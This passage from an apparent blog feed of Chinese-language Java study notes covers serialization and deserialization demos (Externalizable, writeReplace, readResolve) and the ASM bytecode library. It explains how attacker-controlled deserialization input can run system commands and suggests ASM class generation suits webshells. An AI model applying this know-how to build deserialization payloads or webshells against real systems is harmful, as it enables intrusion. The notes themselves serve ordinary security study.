class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) in.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialize success!&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;The name is：&quot;</span>+user.getName());</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220829162019434.png" alt="image-20220829162019434"></p><p>运行后，除了正常对类对象的序列化与反序列化之外，还执行了我们重写的<code>writeObject</code>方法里的命令执行代码。</p><p>这也是反序列化漏洞的成因，如果输入的反序列化数据可以被用户控制，那么攻击者就可以构造恶意的 payload 执行系统命令。</p><h3 id="java-io-Externalizable"><a href="#java-io-Externalizable" class="headerlink" title="java.io.Externalizable"></a>java.io.Externalizable</h3><p><code>java.io.Externalizable</code>和<code>java.io.Serializable</code>几乎一样，只是<code>java.io.Externalizable</code>接口定义了<code>writeExternal</code>和<code>readExternal</code>方法需要序列化和反序列化的类实现，其余则和<code>java.io.Serializable</code>一样。</p><p>创建<code>User</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.writeObject(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = (String) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>主类<code>Main</code>和前面一样保持不变<br><img src="images/image-20220829170100690.png" alt="image-20220829170100690"></p><h2 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h2><p>实现了<code>java.io.Serializable</code>接口的类，可以定义如下方法（反序列化魔术方法），这些方法将会在类序列化或反序列化过程中进行调用：</p><ul><li><code>private void writeObject(ObjectOutputStream out)</code>，自定义序列化</li><li><code>private void readObject(ObjectInputStream in)</code>，自定义反序列化</li><li><code>private void readObjectNoData()</code></li><li><code>protected Object writeReplace()</code></li><li><code>protected Object readResolve()</code></li></ul><p>有些方法在前面已经了解和使用过，说说<code>writeReplace()</code>和<code>readResolve()</code>方法</p><p><code>writeReplace()</code>：返回一个对象，该对象为实际被序列化的对象，在原对象序列化之前被调用，替换原对象成为待序列化对象</p><p><code>readResolve()</code>：返回一个对象，该对象为实际反序列化的结果对象，在原对象反序列化之后被调用，不影响原对象的反序列化过程，仅替换结果</p><p><strong>代码示例：</strong></p><p>创建<code>User</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = <span class="string">&quot;dotast&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">readResolve</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">User</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建<code>Admin</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 17:25</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Admin</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">writeReplace</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建主类<code>Main</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 15:24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        m.serialize();</span><br><span class="line">        m.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">Admin</span> <span class="variable">admin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Admin</span>();</span><br><span class="line">        <span class="comment">// 通过writeObject方法将类对象进行序列化</span></span><br><span class="line">        out.writeObject(admin);</span><br><span class="line">        System.out.println(<span class="string">&quot;serialize success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) in.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialize success!&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;The name is：&quot;</span>+user.getName());</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果：<br><img src="images/image-20220829180709106.png" alt="image-20220829180709106"></p><p>可以看到，在进行序列化的时候，本来序列化的是<code>Admin</code>类，由于<code>writeReplace()</code>方法的存在变成了序列化<code>User</code>类；而<code>User</code>类中定义的<code>name</code>为变量的值为<code>dotast</code>，在进行反序列化的时候，由于<code>readResolve()</code>方法的存在，<code>name</code>变量的值替换成了<code>admin</code>。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>asm</title>
      <link href="/2022/11/19/asm/"/>
      <url>/2022/11/19/asm/</url>
      
        <content type="html"><![CDATA[<h1 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h1><h2 id="分析类"><a href="#分析类" class="headerlink" title="分析类"></a>分析类</h2><p>分析类的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="variable">aBoolean</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello asm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitors类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.FieldVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitors</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitors</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 继承关系</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> version</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> superName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> interfaces</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version,<span class="type">int</span> access,String name,String signature,String superName,String[] interfaces)</span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;extends &quot;</span> + superName + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.visit(version,access,name,signature,superName,interfaces);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 属性变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, Object value)</span> &#123;</span><br><span class="line">        System.out.println(desc + <span class="string">&quot; &quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> exceptions</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; &quot;</span> + desc);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过asm框架分析类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnalysisClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MyClassVisitors</span> <span class="variable">myClassVisitors</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitors</span>();</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        classReader.accept(myClassVisitors,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/150936112-ab83838c-4f67-4102-9816-ce2afa734559.png" alt="image-20220125122358358"></p><p><img src="https://user-images.githubusercontent.com/63966847/150936121-914e2c3a-6019-4f01-91ed-38c5453cab39.png" alt="image-20220125122420194"></p><blockquote><p>该部分也是GI的核心。<a href="https://xz.aliyun.com/t/10363">https://xz.aliyun.com/t/10363</a></p></blockquote><h2 id="生成类"><a href="#生成类" class="headerlink" title="生成类"></a>生成类</h2><blockquote><p>感觉用于webshell中。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WriteClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="comment">// java1.8 public修饰 路径 签名 父类 接口</span></span><br><span class="line">        classWriter.visit(V1_8, ACC_PUBLIC, <span class="string">&quot;com/firebasky/utils/asm/learn/Learn2Test&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;java/lang/Object&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//public和static修饰 方法名 描述符 签名 异常</span></span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">render</span> <span class="operator">=</span> classWriter.visitMethod(ACC_PUBLIC + ACC_STATIC, <span class="string">&quot;render&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//插入一个字段是方法里面插入 操作码 路径 名字 描述符</span></span><br><span class="line">        render.visitFieldInsn(GETSTATIC, <span class="string">&quot;java/lang/System&quot;</span>, <span class="string">&quot;out&quot;</span>, <span class="string">&quot;Ljava/io/PrintStream;&quot;</span>);</span><br><span class="line">        <span class="comment">//插入一个ldc</span></span><br><span class="line">        render.visitLdcInsn(<span class="string">&quot;Hello asm!&quot;</span>);</span><br><span class="line">        <span class="comment">//插入一个方法 操作码 路径 方法名 参数 是否为接口的方法</span></span><br><span class="line">        render.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/io/PrintStream&quot;</span>, <span class="string">&quot;println&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//插入返回值</span></span><br><span class="line">        render.visitInsn(RETURN);</span><br><span class="line">        <span class="comment">//设置栈和局部变量大小</span></span><br><span class="line">        render.visitMaxs(<span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//结束</span></span><br><span class="line">        render.visitEnd();</span><br><span class="line">        classWriter.visitEnd();</span><br><span class="line">        <span class="comment">//生成文件</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.utils.asm.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn2Test</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">()</span> &#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;Hello asm!&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="加载或移除类成员"><a href="#加载或移除类成员" class="headerlink" title="加载或移除类成员"></a>加载或移除类成员</h2><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MyClassVisitor</span> <span class="variable">myClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitor</span>(classWriter);</span><br><span class="line">        classReader.accept(myClassVisitor,<span class="number">0</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitor类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 